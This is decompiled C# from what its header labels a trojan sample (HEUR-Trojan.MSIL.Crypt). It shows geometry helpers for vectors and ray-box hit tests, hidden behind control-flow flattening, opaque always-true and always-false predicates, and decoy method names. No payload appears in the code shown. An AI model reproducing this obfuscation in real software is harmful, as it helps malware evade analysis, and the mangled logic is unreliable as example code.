// Decompiled with JetBrains decompiler
// Type: Tourield.Adapter.PrototypeWriterAdapter
// Assembly: DebuggerTypeProxyAttrib, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9F2D5D-94C2-4B9B-BC0A-C78BF30C6035
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-5acf494024d29f4957958fce64819adc19bc7cffa6d323531e5a321496a04ae0.exe

using DebuggerTypeProxyAttrib.Collections;
using DebuggerTypeProxyAttrib.Pages;
using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Media.Media3D;

namespace Tourield.Adapter
{
  internal class PrototypeWriterAdapter
  {
    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DestroyOrder()
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static double CancelOrder(Vector i, Vector vis) => i.X * vis.X + i.Y * vis.Y;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static double ConnectOrder(Point setup, Vector cont, Point field)
    {
      Vector vis = new Vector(field.X - setup.X, field.Y - setup.Y);
      return PrototypeWriterAdapter.CancelOrder(cont, vis);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static double GetOrder(Vector3D info, Vector3D attr) => info.X * attr.X + info.Y * attr.Y + info.Z * attr.Z;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static double CountOrder(Point3D spec, Vector3D second, Point3D res)
    {
      Vector3D attr = new Vector3D(res.X - spec.X, res.Y - spec.Y, res.Z - spec.Z);
      return PrototypeWriterAdapter.GetOrder(second, attr);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static double CreateOrder(RayHitTestParameters config, Point3D reg)
    {
      Vector3D attr = new Vector3D(reg.X - config.Origin.X, reg.Y - config.Origin.Y, reg.Z - config.Origin.Z);
      return PrototypeWriterAdapter.GetOrder(config.Direction, attr);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static double ManageOrder(Vector last) => Math.Sqrt(PrototypeWriterAdapter.CancelOrder(last, last));

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static double UpdateOrder(Point var1, Point col)
    {
      Vector vector = new Vector(col.X - var1.X, col.Y - var1.Y);
      return Math.Sqrt(PrototypeWriterAdapter.CancelOrder(vector, vector));
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static double PublishOrder(RayHitTestParameters setup, Point3D reg)
    {
      Vector3D vector3D = new Vector3D(reg.X - setup.Origin.X, reg.Y - setup.Origin.Y, reg.Z - setup.Origin.Z);
      return Math.Sqrt(PrototypeWriterAdapter.GetOrder(vector3D, vector3D));
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static double SetupOrder(Point3D task, Point3D b)
    {
      Vector3D vector3D = new Vector3D(b.X - task.X, b.Y - task.Y, b.Z - task.Z);
      return Math.Sqrt(PrototypeWriterAdapter.GetOrder(vector3D, vector3D));
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static bool RevertOrder(RayHitTestParameters param, Rect3D second)
    {
      int num1 = 4;
      bool flag1;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          bool flag2;
          double num3;
          double num4;
          switch (num2)
          {
            case 0:
            case 4:
label_13:
              num3 = 0.0;
              num2 = 1;
              continue;
            case 1:
              if (num3 > second.SizeX)
              {
                num2 = 5;
                continue;
              }
              num4 = 0.0;
              break;
            case 2:
            case 6:
              if (flag2)
              {
                num4 += second.SizeY;
                break;
              }
              goto case 3;
            case 3:
              num3 += second.SizeX;
              goto case 1;
            case 5:
              goto label_8;
            case 7:
              goto label_14;
            default:
              if (PrototypeWriterAdapter.CallMethod())
              {
                num2 = 3;
                continue;
              }
              goto case 3;
          }
          flag2 = num4 <= second.SizeY;
          if (true)
            num2 = 6;
          else
            goto label_13;
        }
label_8:
        flag1 = false;
        num1 = 7;
      }
label_14:
      return flag1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static bool PatchWrapper(RayHitTestParameters value, Rect3D ivk, double serv)
    {
      int num1 = 7;
      bool flag;
      while (true)
      {
        int num2 = num1;
        Vector3D vector3D1;
        Point3D origin;
        while (true)
        {
          Vector3D vector3D2;
          int num3;
          switch (num2)
          {
            case 0:
            case 8:
              goto label_20;
            case 1:
            case 4:
              ref Vector3D local = ref vector3D2;
              double num4 = ivk.X + ivk.SizeX;
              origin = value.Origin;
              double x1 = origin.X;
              double x2 = num4 - x1;
              double num5 = ivk.Y + ivk.SizeY;
              origin = value.Origin;
              double y1 = origin.Y;
              double y2 = num5 - y1;
              double num6 = ivk.Z + ivk.SizeZ;
              origin = value.Origin;
              double z1 = origin.Z;
              double z2 = num6 - z1;
              local = new Vector3D(x2, y2, z2);
              if (vector3D1.X <= serv || vector3D2.X <= serv)
              {
                if (vector3D1.Y <= serv)
                {
                  num3 = 0;
                  break;
                }
                goto label_12;
              }
              else
                goto label_3;
            case 2:
            case 6:
              goto label_10;
            case 3:
              goto label_18;
            case 5:
              num3 = vector3D2.Y > serv ? 1 : 0;
              break;
            case 7:
              goto label_1;
            default:
              num2 = 3;
              continue;
          }
          if (num3 == 0)
          {
            if (vector3D1.Z <= serv || vector3D2.Z <= serv)
            {
              if (PrototypeWriterAdapter.PublishOrder(value, new Point3D((vector3D1.X + vector3D2.X) / 2.0, (vector3D1.Y + vector3D2.Y) / 2.0, (vector3D1.Z + vector3D2.Z) / 2.0)) <= serv + 0.56)
              {
                flag = false;
                if (PrototypeWriterAdapter.CallMethod())
                  num2 = 8;
                else
                  goto label_18;
              }
              else
                goto label_16;
            }
            else
              goto label_14;
          }
          else
            goto label_18;
        }
label_1:
        ref Vector3D local1 = ref vector3D1;
        double x3 = ivk.X;
        origin = value.Origin;
        double x4 = origin.X;
        double x5 = x3 - x4;
        double y3 = ivk.Y;
        origin = value.Origin;
        double y4 = origin.Y;
        double y5 = y3 - y4;
        double z3 = ivk.Z;
        origin = value.Origin;
        double z4 = origin.Z;
        double z5 = z3 - z4;
        local1 = new Vector3D(x5, y5, z5);
        num1 = 4;
        continue;
label_3:
        num1 = 6;
        continue;
label_12:
        num1 = 5;
        continue;
label_18:
        flag = true;
        num1 = 0;
      }
label_10:
      flag = true;
      goto label_20;
label_14:
      flag = true;
      goto label_20;
label_16:
      flag = true;
label_20:
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static bool CustomizeWrapper(
      RayHitTestParameters info,
      Rect3D cust,
      ref List<Point3D> res,
      GlobalErrorCollection info2)
    {
      int num1 = 1;
      bool flag1;
      Vector3D vector3D1;
      Vector3D vector3D2;
      while (true)
      {
        int num2 = num1;
        int num3;
        Vector3D direction;
        Point3D origin;
        bool flag2;
        Vector3D vector3D3;
        while (true)
        {
          int num4;
          int num5;
          double num6;
          double num7;
          double num8;
          double num9;
          double num10;
          double num11;
          int num12;
          switch (num2)
          {
            case 0:
            case 1:
              goto label_6;
            case 2:
              num12 = vector3D3.Z <= cust.Z + cust.SizeZ ? 1 : 0;
              goto label_32;
            case 3:
            case 4:
              goto label_7;
            case 5:
              goto label_27;
            case 6:
              vector3D3 = new Vector3D();
              vector3D3 = info.Direction * num7 * num10;
              Vector3D vector3D4 = new Vector3D();
              vector3D1 = info.Direction * num8 * num11;
              if (vector3D2.Y >= cust.Y + cust.SizeY && vector3D2.Z <= cust.Z + cust.SizeZ)
              {
                if (PrototypeWriterAdapter.CallMethod())
                {
                  num2 = 5;
                  continue;
                }
                goto label_17;
              }
              else if (vector3D3.Y >= cust.X + cust.SizeX)
              {
                if (!PrototypeWriterAdapter.ManageMethod())
                {
                  num2 = 2;
                  continue;
                }
                goto case 2;
              }
              else
              {
                num12 = 0;
                goto label_32;
              }
            case 7:
              goto label_17;
            case 8:
              goto label_26;
            case 9:
              origin = info.Origin;
              num10 = Math.Abs(origin.Y - cust.Y);
              origin = info.Origin;
              num11 = Math.Abs(origin.Z - cust.Z);
              vector3D2 = new Vector3D();
              vector3D2 = info.Direction * num6 * num9;
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto label_35;
            case 10:
              goto label_4;
            case 11:
              if (flag2)
              {
                num5 = 0;
                if (!PrototypeWriterAdapter.ManageMethod())
                {
                  num2 = 15;
                  continue;
                }
                goto label_6;
              }
              else
                goto label_13;
            case 12:
              direction.Normalize();
              if (true)
              {
                num2 = 7;
                continue;
              }
              goto case 6;
            case 13:
              num9 = Math.Abs(origin.X - cust.X);
              goto case 9;
            case 14:
            case 16:
              goto label_35;
            case 15:
label_23:
              if (num5 <= 1)
              {
                num4 = 0;
                goto label_21;
              }
              else
                goto label_24;
            default:
              num2 = 9;
              continue;
          }
label_20:
          ++num4;
label_21:
          if (num4 <= 1)
          {
            if (PrototypeWriterAdapter.CreateOrder(info, new Point3D(cust.X + cust.SizeX * (double) num3, cust.Y + cust.SizeY * (double) num5, cust.Z + cust.SizeZ * (double) num4)) > 0.0)
            {
              PrototypeWriterAdapter.SetupOrder(info.Origin, new Point3D(cust.X + cust.SizeX * (double) num3, cust.Y + cust.SizeY * (double) num5, cust.Z + cust.SizeZ * (double) num4));
              direction = info.Direction;
              num6 = Math.Abs(direction.X);
              direction = info.Direction;
              num7 = Math.Abs(direction.Y);
              direction = info.Direction;
              num8 = Math.Abs(direction.Z);
              num2 = 8;
              continue;
            }
            goto label_20;
          }
          else
          {
            ++num5;
            goto label_23;
          }
label_32:
          if (num12 == 0)
          {
            if (vector3D1.Y < cust.X + cust.SizeX || vector3D1.Y > cust.Y + cust.SizeY)
              goto label_20;
            else
              goto label_19;
          }
          else
            goto label_33;
        }
label_4:
        num3 = 0;
        goto label_25;
label_6:
        direction = info.Direction;
        num1 = 12;
        continue;
label_7:
        Vector3D vector3D5;
        vector3D5.Normalize();
        num1 = 10;
        continue;
label_13:
        flag1 = false;
        num1 = 16;
        continue;
label_17:
        ref Vector3D local = ref vector3D5;
        double x1 = cust.X;
        origin = info.Origin;
        double x2 = origin.X;
        double x3 = x1 - x2;
        double y1 = cust.Y;
        origin = info.Origin;
        double y2 = origin.Y;
        double y3 = y1 - y2;
        double z1 = cust.Z;
        origin = info.Origin;
        double z2 = origin.Z;
        double z3 = z1 - z2;
        local = new Vector3D(x3, y3, z3);
        num1 = 4;
        continue;
label_24:
        ++num3;
label_25:
        flag2 = num3 <= 1;
        num1 = 11;
        continue;
label_26:
        origin = info.Origin;
        num1 = 13;
        continue;
label_33:
        res.Add(new Point3D(vector3D3.X, vector3D3.Y, vector3D3.Z));
        flag1 = true;
        num1 = 14;
      }
label_19:
      res.Add(new Point3D(vector3D1.X, vector3D1.Y, vector3D1.Z));
      flag1 = true;
      goto label_35;
label_27:
      res.Add(new Point3D(vector3D2.X, vector3D2.Y, vector3D2.Z));
      flag1 = true;
label_35:
      return flag1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool InsertWrapper(RayHitTestParameters reference, Rect3D token)
    {
      int num1 = 6;
      bool flag1;
      while (true)
      {
        int num2 = num1;
        bool flag2;
        int num3;
        Point3D origin;
        int num4;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 6:
              goto label_21;
            case 1:
            case 4:
              if (num4 <= 1)
              {
                num3 = 0;
                if (PrototypeWriterAdapter.CallMethod())
                {
                  num2 = 7;
                  continue;
                }
                goto label_24;
              }
              else
                goto label_9;
            case 2:
              goto label_3;
            case 3:
              goto label_4;
            case 5:
              if (!flag2)
              {
                ++num3;
                if (true)
                {
                  num2 = 9;
                  continue;
                }
                goto label_3;
              }
              else
              {
                origin = reference.Origin;
                if (!PrototypeWriterAdapter.EnableWrapper(origin.X, token.X + token.SizeX))
                {
                  origin = reference.Origin;
                  if (PrototypeWriterAdapter.EnableWrapper(origin.Y, token.Y + token.SizeY))
                  {
                    if (PrototypeWriterAdapter.CallMethod())
                    {
                      num2 = 3;
                      continue;
                    }
                    goto label_21;
                  }
                  else
                    goto label_5;
                }
                else
                  goto label_18;
              }
            case 7:
            case 9:
              if (num3 > 1)
              {
                ++num4;
                goto case 1;
              }
              else
                goto label_16;
            case 8:
              goto label_10;
            case 10:
              goto label_24;
            default:
              goto label_15;
          }
        }
label_3:
        int num5;
        flag2 = num5 <= 1;
        num1 = 5;
        continue;
label_5:
        origin = reference.Origin;
        bool flag3 = PrototypeWriterAdapter.EnableWrapper(origin.Z, token.Z + token.SizeZ);
        num1 = 8;
        continue;
label_9:
        flag1 = false;
        num1 = 10;
        continue;
label_10:
        if (!flag3)
        {
          ++num5;
          goto label_3;
        }
        else
          goto label_11;
label_15:
        num1 = 2;
        continue;
label_16:
        num5 = 0;
        goto label_3;
label_21:
        num4 = 0;
        num1 = 4;
      }
label_4:
      flag1 = true;
      goto label_24;
label_11:
      flag1 = true;
      goto label_24;
label_18:
      flag1 = true;
label_24:
      return flag1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool ForgotWrapper(RayHitTestParameters value, Rect3D col)
    {
      int num1 = 2;
      bool flag1;
      while (true)
      {
        int num2 = num1;
        int num3;
        int num4;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_1;
            case 1:
            case 3:
              goto label_14;
            case 4:
              ++num3;
              goto case 6;
            case 5:
              goto label_2;
            case 6:
              if (num3 > 1)
              {
                flag1 = false;
                num2 = 8;
                continue;
              }
              num4 = 0;
              if (true)
              {
                num2 = 7;
                continue;
              }
              goto label_4;
            case 7:
              goto label_4;
            case 8:
              goto label_18;
            default:
              goto label_17;
          }
        }
label_1:
        num3 = 0;
        num1 = 6;
        continue;
label_2:
        bool flag2;
        int num5;
        if (!flag2)
        {
          ++num4;
        }
        else
        {
          if (PrototypeWriterAdapter.CreateOrder(value, new Point3D(col.X + col.SizeX * (double) num3, col.Y + col.SizeY * (double) num4, col.Z + col.SizeZ * (double) num5)) <= 0.0)
          {
            ++num5;
            num1 = 1;
            continue;
          }
          break;
        }
label_4:
        if (num4 > 1)
        {
          num1 = 4;
          continue;
        }
        num5 = 0;
label_14:
        flag2 = num5 <= 1;
        goto label_2;
label_17:
        num1 = 5;
      }
      flag1 = true;
label_18:
      return flag1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool EnableWrapper(double asset, double reg)
    {
      int num = 4;
      bool flag1;
      bool flag2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            flag2 = asset == 0.0;
            num = 5;
            continue;
          case 1:
          case 2:
          case 3:
          case 6:
            goto label_9;
          case 5:
            if (!flag2)
            {
              if (asset / Math.Abs(asset) != reg / Math.Abs(reg))
              {
                flag1 = false;
                num = 6;
                continue;
              }
              goto label_2;
            }
            else
            {
              flag1 = false;
              num = 3;
              continue;
            }
          default:
            num = 1;
            continue;
        }
      }
label_2:
      flag1 = true;
label_9:
      return flag1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool ResetWrapper(
      double def,
      double result,
      double filter,
      double info2,
      double init3,
      double ident4)
    {
      int num1 = 3;
      bool flag;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
          case 3:
            if (def < filter)
            {
              num3 = 0;
              break;
            }
            num2 = 4;
            goto label_9;
          case 1:
          case 4:
            num3 = def <= filter + init3 ? 1 : 0;
            break;
          case 2:
            goto label_8;
          case 5:
          case 6:
            goto label_12;
          default:
            num2 = 5;
            goto label_9;
        }
        if (num3 != 0 && result >= info2 && result <= info2 + ident4)
        {
          if (true)
          {
            num1 = 2;
            continue;
          }
          goto label_12;
        }
        else
        {
          flag = false;
          num2 = 6;
        }
label_9:
        num1 = num2;
      }
label_8:
      flag = true;
label_12:
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public PrototypeWriterAdapter()
    {
      RegistryPagePage.ListMethod();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool CallMethod() => true;

    internal static bool ManageMethod() => false;
  }
}
